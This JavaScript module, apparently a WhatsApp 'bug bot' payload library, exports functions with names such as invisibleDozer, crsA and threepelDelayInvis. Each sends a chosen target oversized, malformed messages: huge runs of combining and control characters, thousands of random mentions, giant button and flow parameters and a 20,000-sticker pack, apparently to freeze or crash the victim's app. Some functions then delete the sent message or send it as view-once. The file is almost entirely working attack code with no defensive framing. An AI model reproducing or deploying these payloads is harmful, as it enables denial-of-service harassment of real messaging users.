const {
    default: makeWASocket,   
    prepareWAMessageMedia,   
    removeAuthState,  
    useMultiFileAuthState,   
    DisconnectReason,   
    fetchLatestBaileysVersion,   
    makeInMemoryStore,   
    generateWAMessageFromContent,   
    generateWAMessageContent,   
    generateWAMessage,  
    jidDecode,   
    proto,   
    delay,  
    relayWAMessage,   
    getContentType,   
    generateMessageTag,  
    getAggregateVotesInPollMessage,   
    downloadContentFromMessage,   
    fetchLatestWaWebVersion,   
    InteractiveMessage,   
    makeCacheableSignalKeyStore,   
    Browsers,   
    generateForwardMessageContent,   
    MessageRetryMap
} = require("ell-bail");
const axios = require("axios");
const crypto = require("crypto");
const fs = require('fs');  
const ImgCrL = null;
async function thumb() {
  const sharp = require("sharp");
  const axios = require("axios");
  const response = await axios.get("hhttps://files.catbox.moe/c4epi7.jpg", { responseType: "arraybuffer" });
  const buffer = Buffer.from(response.data);
  const resized = await sharp(buffer)
    .resize(250, 250, { fit: "cover" })
    .jpeg({ quality: 100 })
    .toBuffer();
  return resized.toString("base64");
};
const xxx = async () => {
  const sharp = require("sharp");
  const axios = require("axios");
  const response = await axios.get("https://files.catbox.moe/c4epi7.jpg", { responseType: "arraybuffer" });
  const buffer = Buffer.from(response.data);
  const resized = await sharp(buffer)
    .resize(250, 250, { fit: "cover" })
    .jpeg({ quality: 100 })
    .toBuffer();
  return resized.toString("base64");
};
async function delayJembut(sock, target) {
  try {
    const n = await sock.relayMessage(
      target,
      {
        extendedTextMessage: {
          text: "\u0000".repeat(10000),
          matchedText: "⃝꙰꙰꙰".repeat(10000),
          description: "Its Me Icha",
          title: "᬴".repeat(10000),
          previewType: "NONE",
          jpegThumbnail: null,
          inviteLinkGroupTypeV2: "DEFAULT",
          contextInfo: {
            isForwarded: true,
            forwardingScore: 999,
            remoteJid: "status@broadcast",
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                { length: 1900 },
                () => `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
              )
            ],
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 3,
                expiryTimestamp: Date.now() + 1814400000
              }
            },
            forwardedNewsletterMessageInfo: {
              newsletterName: "⃝꙰꙰꙰",
              newsletterJid: "13135550002@newsletter",
              serverId: 1
            }
          }
        }
      },
      { participant: { jid: target } }
    );
    await sock.sendMessage(target, {
      delete: { fromMe: true, remoteJid: target, id: n }
    });
  } catch (err) {
    console.error("error:", err);
    throw new Error(err.message);
  }
}
async function blankButton(sock, target) {
await sock.sendMessage(
  target,
  {
    text: "\u0000",
    buttons: [
      {
        buttonId: ".",
        buttonText: { displayText: "Its Me Icha" },
        type: 4,
        nativeFlowInfo: {
          name: "single_select",
          paramsJson: JSON.stringify({ title: "᬴".repeat(70000)})
        }
      },
      {
        buttonId: ".",
        buttonText: { displayText: "Its Me Icha" },
        type: 4,
        nativeFlowInfo: {
          name: "single_select",
          paramsJson: JSON.stringify({ title: "᬴".repeat(70000)})
        }
      },
      {
        buttonId: ".",
        buttonText: { displayText: "Its Me Icha" },
        type: 4,
        nativeFlowInfo: {
          name: "single_select",
          paramsJson: JSON.stringify({ title: "᬴".repeat(70000)})
        }
      }
    ],
    headerType: 1
  }, { participant: { jid: target } });
}
async function Blank2(sock, target) {
try {
const msg = generateWAMessageFromContent(target, {
  viewOnceMessage: {
    message: {
      interactiveMessage: {
        body: { text: "\u0000" },
        contextInfo: {
            isForwarded: true,
            forwardingScore: 999,
            remoteJid: "status@broadcast",
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                { length: 1999 },
                () => `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
              )
            ]
          },
        nativeFlowMessage: {
          buttons: [
            {
              name: "single_select",
              buttonParamsJson: JSON.stringify({
                title: "ោ៝".repeat(60000)
              })
            },
            {
              name: "single_select",
              buttonParamsJson: JSON.stringify({
                title: "ោ៝".repeat(60000)
              })
            },
            {
              name: "galaxy_message",
              buttonParamsJson: JSON.stringify({
                flow_message_version: "3",
                flow_token: "unused",
                flow_id: "9876543210",
                flow_cta: "ោ៝".repeat(30000),
                flow_action: "form_submit",
                flow_action_payload: { from_id: null },
                icon: "PROMOTE"
              })
            }
          ],
          messageParamsJson: "{}".repeat(10000)
        }
      }
    }
  }
}, {});
  await sock.relayMessage(target, msg.message, {
      messageId: msg.key.id,
      participant: { jid: target }
   });
  } catch (err) {
    console.error(err);
  }
}
async function bClck(sock, target) {
const msg = {
  newsletterAdminInviteMessage: {
    newsletterJid: "1@newsletter",
    newsletterName: "ោ៝".repeat(10000),
    caption: "ꦾ".repeat(60000) + "ោ៝".repeat(60000),
    inviteExpiration: "999999999",
    jpegThumbnail: await thumb(),
    contextInfo: {
      mentionedJid: Array.from(
        { length: 2000 },
        () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
      ),
      remoteJid: "status@broadcast",
      isForwarded: true,
      forwardingScore: 9999,
      externalAdReply: {
        quotedAd: {
          advertiserName: "\u0000".repeat(60000),
          mediaType: "IMAGE",
          jpegThumbnail: await thumb(),
          caption: "Icha" + "𑇂𑆵𑆴𑆿".repeat(60000)
        },
        placeholderKey: {
          remoteJid: "0s.whatsapp.net",
          fromMe: false,
          id: "ABCDEF1234567890"
        }
      },
      quotedMessage: {
        groupInviteMessage: {
          groupJid: "1@g.us",
          inviteCode: "abcd1234",
          inviteExpiration: null,
          groupName: "ꦽ".repeat(30000),
          jpegThumbnail: null
        }
      }
    }
  }
};
 await sock.relayMessage(target, msg, {
    participant: { jid: target },
    messageId: null
  });
}
async function invisibleDozer(sock, target) {
  try {
    const msg = generateWAMessageFromContent(
      target,
      {
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              body: { text: "\u0000" },
              nativeFlowMessage: {
                messageParamsJson: "{}".repeat(10000),
              },
              contextInfo: {
                participant: target,
                remoteJid: "status@broadcast",
                mentionedJid: Array.from(
                  { length: 42000 },
                  () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
                )
              }
            }
          }
        }
      },
      {}
    );
    await sock.relayMessage(target, msg.message, {
      messageId: msg.key.id,
      participant: { jid: target }
    });
  } catch (err) {
    console.error(err);
    throw new Error(err.message);
  }
}
async function crsA(sock, target) {
  const generateMentions = (count) => [
    "0@s.whatsapp.net",
    ...Array.from({ length: count }, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`)
  ];
  const cc = {
    mentionedJid: generateMentions(1999),
    remoteJid: "X",
    participant: `${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`,
    stanzaId: "123",
    groupMentions: [],
    entryPointConversionSource: "non_contact",
    entryPointConversionApp: "whatsapp",
    entryPointConversionDelaySeconds: 467593,
    quotedMessage: {
      paymentInviteMessage: {
        serviceType: 3,
        expiryTimestamp: Date.now() + 1814400000,
        contextInfo: {
          mentionedJid: generateMentions(1999),
          forwardedAiBotMessageInfo: {
            botName: "META AI",
            botJid: `${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`,
            creatorName: "Bot"
          }
        }
      }
    }
  };
  const _message = {
    viewOnceMessage: {
      message: {
        newsletterAdminInviteMessage: {
          newsletterJid: "322@newsletter",
          newsletterName: "ោ៝".repeat(20000),
          caption: "ោ៝".repeat(20000),
          jpegThumbnail: await thumb(),
          inviteExpiration: Date.now() + 999999999,
          inviteLink: `https://chat.whatsapp.com/${"\x10".repeat(5000)}${"ꦾ".repeat(5000)}`, 
          isInviteOnly: true,
          isPinned: true,
          contextInfo: cc
        }
      }
    }
  };
  const message = {
    viewOnceMessage: {
      message: {
        extendedTextMessage: {
          text: `> *its me icha*${"ោ៝".repeat(20000)}`,
          matchedText: "https://wa.me/stickerpack/\x10",
          description: "ꦾꦾ".repeat(10000),
          title: "ꦾꦾ".repeat(10000),
          previewType: "NONE",
          jpegThumbnail: await thumb(),
          inviteLinkGroupTypeV2: "DEFAULT",
          inviteLink: `https://chat.whatsapp.com/${"\x10".repeat(5000)}${"ꦾ".repeat(5000)}`,
          contextInfo: cc
        }
      }
    }
  };
  const msg = generateWAMessageFromContent(target, message, {});
  const _msg = generateWAMessageFromContent(target, _message, {});
  await sock.relayMessage(target, msg.message, {
    messageId: msg.key.id,
    participant: { jid: target }
  });
  await sock.relayMessage(target, _msg.message, {
    messageId: _msg.key.id,
    participant: { jid: target }
  });
}
async function threepelDelayInvis(sock, target) {
  const mentionedJids = [
    "1355514232@s.whatsapp.net",
    ...Array.from({ length: 1999 }, () => `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`)
  ];
  const additionalNodes = [
    {
      tag: "meta",
      attrs: {},
      content: [
        {
          tag: "mentioned_users",
          attrs: {},
          content: [
            {
              tag: "to",
              attrs: { jid: target }
            }
          ]
        }
      ]
    }
  ];
  const msg1 = {
    viewOnceMessage: {
      message: {
        lottieStickerMessage: {
          message: {
            stickerMessage: {
              url: "https://mmg.whatsapp.net/v/t62.15575-24/567293002_1345146450341492_7431388805649898141_n.enc?ccb=11-4&oh=01_Q5Aa2wGWTINA0BBjQACmMWJ8nZMZSXZVteTA-03AV_zy62kEUw&oe=691B041A&_nc_sid=5e03e0&mms3=true",
              fileSha256: "ljadeB9XVTFmWGheixLZRJ8Fo9kZwuvHpQKfwJs1ZNk=",
              fileEncSha256: "D0X1KwP6KXBKbnWvBGiOwckiYGOPMrBweC+e2Txixsg=",
              mediaKey: "yRF/GibTPDce2s170aPr+Erkyj2PpDpF2EhVMFiDpdU=",
              mimetype: "application/was",
              height: 512,
              width: 512,
              directPath: "/v/t62.15575-24/567293002_1345146450341492_7431388805649898141_n.enc?ccb=11-4&oh=01_Q5Aa2wGWTINA0BBjQACmMWJ8nZMZSXZVteTA-03AV_zy62kEUw&oe=691B041A&_nc_sid=5e03e0",
              fileLength: 14390,
              mediaKeyTimestamp: 1760786856,
              isAnimated: true,
              stickerSentTs: 1760786855983,
              isLottie: true,
              contextInfo: {
                mentionedJid: mentionedJids
              }
            }
          }
        }
      }
    }
  };
  const msg2 = {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { text: "xyz", format: "DEFAULT" },
          contextInfo: { mentionedJid: mentionedJids },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: "\x10".repeat(1045000),
            version: 3
          },
          entryPointConversionSource: "call_permission_request"
        }
      }
    }
  };
  const msg3 = {
    viewOnceMessage: {
      message: {
        stickerPackMessage: {
          stickerPackId: "1e66102f-2c7c-4bb9-80cf-811e922bd1a8",
          name: "ꦴꦿ".repeat(49000),
          publisher: "",
          stickers: Array.from({ length: 20000 }, () => ({
            url: "https://mmg.whatsapp.net/v/t62.15575-24/567293002_1345146450341492_7431388805649898141_n.enc?ccb=11-4&oh=01_Q5Aa2wGWTINA0BBjQACmMWJ8nZMZSXZVteTA-03AV_zy62kEUw&oe=691B041A&_nc_sid=5e03e0&mms3=true",
            fileSha256: "ljadeB9XVTFmWGheixLZRJ8Fo9kZwuvHpQKfwJs1ZNk=",
            fileEncSha256: "D0X1KwP6KXBKbnWvBGiOwckiYGOPMrBweC+e2Txixsg=",
            mediaKey: "yRF/GibTPDce2s170aPr+Erkyj2PpDpF2EhVMFiDpdU=",
            mimetype: "application/webp",
            height: 512,
            width: 512,
            directPath: "/v/t62.15575-24/567293002_1345146450341492_7431388805649898141_n.enc?ccb=11-4&oh=01_Q5Aa2wGWTINA0BBjQACmMWJ8nZMZSXZVteTA-03AV_zy62kEUw&oe=691B041A&_nc_sid=5e03e0",
            fileLength: 14390,
            mediaKeyTimestamp: 1760786856,
            isAnimated: true,
            stickerSentTs: 1760786855983,
            isLottie: true,
            contextInfo: { mentionedJid: mentionedJids }
          })),
          contextInfo: { mentionedJid: mentionedJids },
          fileLength: "8020935",
          fileSha256: "77oJbl0eWZ4bi8z0RZxLsZJ1tu+f/ZErcYE8Sj2K1+U=",
          fileEncSha256: "2KwixOJtpl4ivq8HMgTQGICW+HMxLnZuQmUN6KPD4kg=",
          mediaKey: "i4I6325nsuHeYhj4KuyeZ+8bHAxE6A5Rt5uzyNRIaTk=",
          directPath: "/v/t62.15575-24/23212937_564001070100700_5740166209540264226_n.enc?ccb=11-4&oh=01_Q5Aa1wFfJ2yPLT287gHgeKwk1Ifh1jowuwT0trU3-hyqosIQoQ&oe=686EC6A7&_nc_sid=5e03e0",
          stickerPackSize: "15000000000",
          stickerPackOrigin: "USER_CREATED"
        }
      }
    }
  };
  for (const el of [msg1, msg2, msg3]) {
    const msg = generateWAMessageFromContent(target, proto.Message.fromObject(el), {});
    await sock.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [target],
      additionalNodes
    });
    await sock.relayMessage(
      target,
      {
        groupStatusMentionMessage: {
          message: {
            protocolMessage: { key: msg.key, type: 25 }
          }
        }
      },
      { additionalNodes }
    );
    await new Promise((resolve) => setTimeout(resolve, 500));
  }
}
module.exports = { blankButton, Blank2, crsA, bClck, invisibleDozer, delayJembut, threepelDelayInvis }